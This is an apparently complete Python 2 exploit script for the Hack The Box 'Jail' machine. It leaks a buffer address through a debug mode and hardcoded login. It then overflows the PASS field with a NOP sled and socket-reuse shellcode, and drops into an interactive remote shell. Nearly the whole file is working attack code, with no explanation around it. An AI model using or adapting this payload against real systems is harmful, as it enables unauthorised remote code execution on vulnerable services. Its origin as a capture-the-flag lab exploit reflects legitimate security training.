#!/usr/bin/env python
import socket, struct, sys, time, telnetlib

HOST = '10.10.10.34'
SRVPORT = 7411

# Linux/x86 - Socket Re-use Combo by ZadYree (50 bytes)
# http://shell-storm.org/shellcode/files/shellcode-881.php
shellcode=("\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80")

def banner():
    print r"  ___ ________________________       ____.      .__.__    "
    print r" /   |   \__    ___/\______   \     |    |____  |__|  |   "
    print r"/    ~    \|    |    |    |  _/     |    \__  \ |  |  |   "
    print r"\    Y    /|    |    |    |   \ /\__|    |/ __ \|  |  |__ "
    print r" \___|_  / |____|    |______  / \________(____  /__|____/ "
    print r"       \/                   \/                \/          "
    print "               HTB Jail Remote Exploit By Cneeliz - 2017 \n"

def getbufferaddr(HOST, SRVPORT):
    try:
        s = socket.create_connection((HOST, SRVPORT))
    except:
        print "\n[!] Connection Failed... \n"
        exit()

    print "[*] Getting userpass Buffer Address...\n"
    time.sleep(1.0)
    s.send("DEBUG")
    time.sleep(0.5)
    s.recv(1024)

    s.send("USER admin")
    time.sleep(0.5)
    s.recv(1024)

    s.send("PASS 1974jailbreak!")
    time.sleep(0.5)
    print s.recv(1024)

    s.close()

    print "[*] Now run %s Buffer Address (e.g. %s 0xd3adb33f)\n" % (sys.argv[0], sys.argv[0]) 

def conv(addr):
    return struct.pack("<I", addr)

def exploit(HOST, SRVPORT, userbuffer_addr):
    shellcode_offs = 0x40
    ret_addr = int(userbuffer_addr, 0) + shellcode_offs
    print "[*] Shellcode @ 0x%x" % ret_addr

    try:
        s = socket.create_connection((HOST, SRVPORT))
    except:
        print "\n[!] Connection Failed... \n"
        exit()

    print "[*] Let's try to Exploit..."
    #raw_input("Press Enter to continue...")
    time.sleep(1.0)
    s.recv(1024)

    s.send("USER admin")
    #raw_input("Press Enter to continue...")
    time.sleep(1.0)
    s.recv(1024)

    payload = "PASS " 
    payload += "A" * 28
    payload += conv(ret_addr)
    payload += "\x90" * 48
    payload += shellcode
    payload += "\x90" * 16

    s.send(payload)
    time.sleep(1.0)
    try:
        print "[*] Trying to connect to our Shell...\n"
        t = telnetlib.Telnet()
        t.sock = s
        t.write(b"hostname; id\n")
        t.interact()
    except:
        print "[!] Exploit Failed :( \n"

    s.close()

if __name__ == '__main__':
    banner()
    if len(sys.argv) < 2:
        getbufferaddr(HOST, SRVPORT)
        sys.exit(0)

    exploit(HOST, SRVPORT, sys.argv[1])
    sys.exit(0)
